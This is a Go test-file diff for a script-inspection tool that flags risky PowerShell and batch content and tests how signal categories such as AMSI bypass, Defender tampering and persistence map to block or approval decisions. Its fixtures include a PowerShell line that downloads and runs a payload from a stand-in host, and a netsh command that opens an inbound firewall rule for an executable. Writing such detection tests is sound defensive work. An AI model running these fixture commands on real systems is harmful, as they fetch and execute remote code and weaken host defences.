@@ -128,6 +128,46 @@ func TestInspectFile_DangerousJS(t *testing.T) {
 	}
 }
 
+func TestInspectFile_PowerShellSignals(t *testing.T) {
+	tmpDir := t.TempDir()
+	psFile := filepath.Join(tmpDir, "dangerous.ps1")
+	content := []byte("iex (New-Object Net.WebClient).DownloadString('http://evil.example/payload.ps1')\n")
+	if err := os.WriteFile(psFile, content, 0o644); err != nil {
+		t.Fatalf("failed to write PowerShell file: %v", err)
+	}
+
+	result, err := InspectFile(psFile, DefaultMaxBytes)
+	if err != nil {
+		t.Fatalf("InspectFile returned error: %v", err)
+	}
+	if len(result.Signals) == 0 {
+		t.Fatal("expected signals for dangerous PowerShell file, got 0")
+	}
+	if result.Decision != DecisionApproval {
+		t.Fatalf("expected APPROVAL for dangerous PowerShell file, got %s", result.Decision)
+	}
+}
+
+func TestInspectFile_BatchSignals(t *testing.T) {
+	tmpDir := t.TempDir()
+	batchFile := filepath.Join(tmpDir, "dangerous.bat")
+	content := []byte("netsh advfirewall firewall add rule name=\"evil\" dir=in action=allow program=\"C:\\Temp\\evil.exe\"\n")
+	if err := os.WriteFile(batchFile, content, 0o644); err != nil {
+		t.Fatalf("failed to write batch file: %v", err)
+	}
+
+	result, err := InspectFile(batchFile, DefaultMaxBytes)
+	if err != nil {
+		t.Fatalf("InspectFile returned error: %v", err)
+	}
+	if len(result.Signals) == 0 {
+		t.Fatal("expected signals for dangerous batch file, got 0")
+	}
+	if result.Decision != DecisionApproval {
+		t.Fatalf("expected APPROVAL for dangerous batch file, got %s", result.Decision)
+	}
+}
+
 func TestInspectFile_MissingFile(t *testing.T) {
 	result, err := InspectFile("/nonexistent/path/to/script.py", DefaultMaxBytes)
 	if err != nil {
@@ -330,6 +370,16 @@ func TestDetectReferencedFile(t *testing.T) {
 			expected: "deploy.sh",
 		},
 		{
+			name:     "powershell.exe with .ps1 file",
+			command:  "powershell.exe -NoProfile -File script.ps1",
+			expected: "script.ps1",
+		},
+		{
+			name:     "pwsh with .ps1 file",
+			command:  "pwsh ./scripts/deploy.ps1",
+			expected: "./scripts/deploy.ps1",
+		},
+		{
 			name:     "sh with .sh file",
 			command:  "sh /opt/scripts/run.sh",
 			expected: "/opt/scripts/run.sh",
@@ -432,6 +482,42 @@ func TestInferDecisionFromSignals_CloudSDKPlusDestructiveIsApproval(t *testing.T
 	}
 }
 
+func TestInferDecisionFromSignals_WindowsBlockedSignals(t *testing.T) {
+	tests := []string{"defender_tamper", "amsi_bypass"}
+	for _, category := range tests {
+		t.Run(category, func(t *testing.T) {
+			signals := []inspect.Signal{{Category: category, Pattern: category, Line: 1, Match: category}}
+			if got := inferDecisionFromSignals(signals); got != DecisionBlocked {
+				t.Fatalf("expected BLOCKED for %s, got %s", category, got)
+			}
+		})
+	}
+}
+
+func TestInferDecisionFromSignals_WindowsApprovalSignals(t *testing.T) {
+	tests := []string{"lolbin", "http_download", "process_spawn", "persistence", "firewall_modify", "user_modify"}
+	for _, category := range tests {
+		t.Run(category, func(t *testing.T) {
+			signals := []inspect.Signal{{Category: category, Pattern: category, Line: 1, Match: category}}
+			if got := inferDecisionFromSignals(signals); got != DecisionApproval {
+				t.Fatalf("expected APPROVAL for %s, got %s", category, got)
+			}
+		})
+	}
+}
+
+func TestInferDecisionFromSignals_WindowsCautionSignals(t *testing.T) {
+	tests := []string{"registry_modify", "network_object"}
+	for _, category := range tests {
+		t.Run(category, func(t *testing.T) {
+			signals := []inspect.Signal{{Category: category, Pattern: category, Line: 1, Match: category}}
+			if got := inferDecisionFromSignals(signals); got != DecisionCaution {
+				t.Fatalf("expected CAUTION for %s, got %s", category, got)
+			}
+		})
+	}
+}
+
 func TestDetectReferencedFile_ScriptlessMode(t *testing.T) {
 	tests := []struct {
 		name    string
@@ -468,6 +554,18 @@ func TestDetectReferencedFile_ScriptlessMode(t *testing.T) {
 		{
 			name:    "bash -c",
 			command: "bash -c 'echo hello'",
+		},
+		{
+			name:    "powershell.exe -Command",
+			command: "powershell.exe -Command Get-Process",
+		},
+		{
+			name:    "pwsh -c",
+			command: "pwsh -c 'Get-Process'",
+		},
+		{
+			name:    "powershell encoded command",
+			command: "powershell -EncodedCommand SQBlAHgA",
 		},
 		{
 			name:    "sh -c",
